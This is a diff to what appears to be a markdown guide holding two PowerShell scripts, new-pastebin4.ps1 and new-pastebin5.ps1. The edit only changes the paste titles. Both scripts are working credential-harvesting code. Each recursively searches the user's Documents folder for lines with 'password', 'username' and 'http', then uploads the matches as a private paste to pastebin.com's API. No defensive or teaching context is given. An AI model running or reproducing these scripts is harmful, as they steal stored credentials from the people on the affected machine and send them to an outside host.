@@ -139,14 +139,14 @@ Create new-pastebin4.ps1 and new-pastebin5.ps1
 new-pastebin4.ps1
 ```
 . .\logindata.ps1
-$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin3"
+$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin4"
 $Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
 Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
 ```
 new-pastebin5.ps1
 ```
 $DevKey="PUT-DEVKEY-HERE";$UserKey="PUT-USER-KEY-HERE"
-$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin3"
+$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin5"
 $Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
 Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
 ```
